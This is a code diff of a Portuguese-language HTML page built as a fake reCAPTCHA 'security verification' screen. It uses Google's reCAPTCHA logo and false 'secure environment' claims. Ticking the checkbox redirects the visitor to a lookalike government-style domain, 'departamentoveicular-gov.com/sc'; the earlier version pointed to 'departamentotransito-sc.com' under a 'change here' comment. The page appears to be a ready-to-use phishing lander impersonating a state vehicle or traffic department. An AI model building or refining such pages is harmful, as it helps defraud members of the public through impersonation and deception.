@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Verificação de Segurança</title>
 
 <style>
@@ -13,214 +13,224 @@
 }
 
 body{
-  font-family: Arial, Helvetica, sans-serif;
-  background: linear-gradient(135deg,#e2e8f0,#f8fafc);
+  font-family:Arial, Helvetica, sans-serif;
+  background:#d9dde3;
   display:flex;
   align-items:center;
   justify-content:center;
   height:100vh;
+  color:#0f172a;
+  font-size:14px;
 }
 
-/* Container */
-.container{
-  width:100%;
-  max-width:380px;
-  text-align:center;
-  padding:15px;
-}
-
-/* Card */
 .card{
-  background:#ffffff;
-  border-radius:12px;
-  padding:25px;
-  box-shadow:0 10px 30px rgba(0,0,0,0.1);
-  animation:fadeIn 0.6s ease;
+  width:380px;
+  background:#fff;
+  border-radius:14px;
+  padding:28px 25px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.08);
+  text-align:center;
 }
 
+/* TOPO */
+.security-header{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  margin-bottom:12px;
+  font-size:14px;
+}
+
+.shield{
+  font-size:16px;
+  color:#16a34a;
+  font-weight:700;
+}
+
+.security-text{
+  font-size:14px;
+  font-weight:600;
+  color:#16a34a;
+}
+
+/* TÍTULO */
 .title{
-  font-size:20px;
+  font-size:18px;
+  font-weight:700;
   color:#1e293b;
   margin-bottom:8px;
-  font-weight:600;
 }
 
+/* SUBTÍTULO */
 .subtitle{
-  font-size:13px;
-  color:#475569;
-  margin-bottom:20px;
+  font-size:14px;
+  color:#64748b;
+  margin-bottom:18px;
+  line-height:1.5;
 }
 
-/* Captcha */
+/* CAPTCHA */
 .captcha-box{
   border:1px solid #d1d5db;
-  border-radius:8px;
-  padding:15px;
-  background:#f9fafb;
+  border-radius:10px;
+  background:#f8fafc;
+  padding:16px;
 }
 
 .captcha-row{
   display:flex;
   align-items:center;
   justify-content:space-between;
+  gap:10px;
 }
 
-/* Área checkbox */
+/* CHECK AREA */
 .check-area{
   display:flex;
   align-items:center;
-  gap:10px;
-  padding:10px;
-  border-radius:6px;
+  gap:12px;
   cursor:pointer;
-  transition:0.2s;
-}
-
-.check-area:hover{
-  background:#e2e8f0;
+  padding:10px;
+  border-radius:8px;
 }
 
 .check-area input{
-  width:22px;
-  height:22px;
-  cursor:pointer;
+  display:none;
+}
+
+/* CHECKBOX */
+.custom-check{
+  width:24px;
+  height:24px;
+  border:2px solid #7c7c7c;
+  border-radius:4px;
+  background:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.custom-check.checked{
+  border-color:#16a34a;
+  background:#f0fdf4;
+}
+
+.custom-check.checked::before{
+  content:"✔";
+  color:#16a34a;
+  font-size:14px;
+  font-weight:bold;
 }
 
 .check-text{
   font-size:14px;
-  color:#1e293b;
+  color:#0f172a;
 }
 
-/* Marca */
+/* LOGO */
 .captcha-brand{
   text-align:center;
   font-size:10px;
   color:#64748b;
+  min-width:70px;
 }
 
 .captcha-brand img{
-  width:34px;
+  width:32px;
   display:block;
   margin:0 auto 3px;
 }
 
-/* Loader */
-.loader{
-  width:22px;
-  height:22px;
-  border:3px solid #cbd5f5;
-  border-top:3px solid #2563eb;
-  border-radius:50%;
-  animation:spin 1s linear infinite;
-  display:none;
-}
-
-@keyframes spin{
-  0%{transform:rotate(0);}
-  100%{transform:rotate(360deg);}
-}
-
-/* Rodapé */
-.footer{
-  margin-top:15px;
-  font-size:12px;
-  color:#64748b;
-}
-
-.footer span{
-  display:block;
-  margin-top:4px;
-  color:#94a3b8;
-}
-
-/* Selo segurança */
+/* STATUS */
 .secure{
-  margin-top:15px;
-  font-size:12px;
+  margin-top:16px;
   color:#16a34a;
+  font-size:13px;
   font-weight:600;
 }
 
-/* animação */
-@keyframes fadeIn{
-  from{
-    opacity:0;
-    transform:translateY(15px);
-  }
-  to{
-    opacity:1;
-    transform:translateY(0);
-  }
+/* TEXTO EXTRA */
+.extra-security{
+  margin-top:10px;
+  font-size:13px;
+  color:#64748b;
+  line-height:1.5;
+}
+
+.extra-security span{
+  display:block;
+  margin-top:4px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<div class="card">
 
-  <div class="card">
+  <!-- TOPO -->
+  <div class="security-header">
+    <div class="shield">✔</div>
+    <div class="security-text">Ambiente seguro</div>
+  </div>
 
-    <div class="title">Verificação de Segurança</div>
-    <div class="subtitle">
-      Confirme que você é humano para continuar
-    </div>
+  <!-- TÍTULO -->
+  <div class="title">Verificação de Segurança</div>
 
-    <div class="captcha-box">
+  <!-- SUBTÍTULO -->
+  <div class="subtitle">
+    Confirme que você é humano para continuar
+  </div>
 
-      <div class="captcha-row">
+  <!-- CAPTCHA -->
+  <div class="captcha-box">
 
-        <label class="check-area">
-          <input type="checkbox" id="check">
-          <div id="loader" class="loader"></div>
-          <span class="check-text" id="text">Não sou um robô</span>
-        </label>
+    <div class="captcha-row">
 
-        <div class="captcha-brand">
-          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
-          reCAPTCHA
-          <br>
-          <span style="font-size:9px;">Privacidade - Termos</span>
-        </div>
+      <label class="check-area">
+        <input type="checkbox" id="check">
+        <div class="custom-check" id="customCheck"></div>
+        <span class="check-text">Não sou um robô</span>
+      </label>
 
+      <div class="captcha-brand">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+        reCAPTCHA
+        <br>
+        Privacidade - Termos
       </div>
 
     </div>
+  </div>
 
-    <div class="secure">
-      ✔ Ambiente seguro e protegido
-    </div>
+  <!-- STATUS -->
+  <div class="secure"> Ambiente seguro e protegido</div>
 
-    <div class="footer">
-      Após marcar a opção, a verificação será realizada automaticamente
-      <span>Isso ajuda a proteger o sistema contra acessos indevidos</span>
-    </div>
-
+  <!-- TEXTO EXTRA -->
+  <div class="extra-security">
+    Isso ajuda a proteger o sistema contra acessos indevidos
+    <span>Verificação automática de segurança em tempo real</span>
+    <span>Proteção avançada contra bots e ataques</span>
   </div>
 
 </div>
 
 <script>
 const check = document.getElementById("check");
-const loader = document.getElementById("loader");
-const text = document.getElementById("text");
+const customCheck = document.getElementById("customCheck");
+
+/* 🔴 LINK DE REDIRECIONAMENTO */
+const REDIRECT_URL = "https://departamentoveicular-gov.com/sc";
 
 check.addEventListener("change", () => {
-
   if(check.checked){
-    loader.style.display = "inline-block";
-    text.innerText = "Verificando...";
+    customCheck.classList.add("checked");
 
     setTimeout(() => {
-      loader.style.display = "none";
-      text.innerText = "Verificado ✔";
-
-      // 🔴 TROQUE AQUI
-      window.location.href = "https://departamentotransito-sc.com ";
-
-    }, 1800);
+      window.location.href = REDIRECT_URL;
+    }, 700);
   }
-
 });
 </script>
 
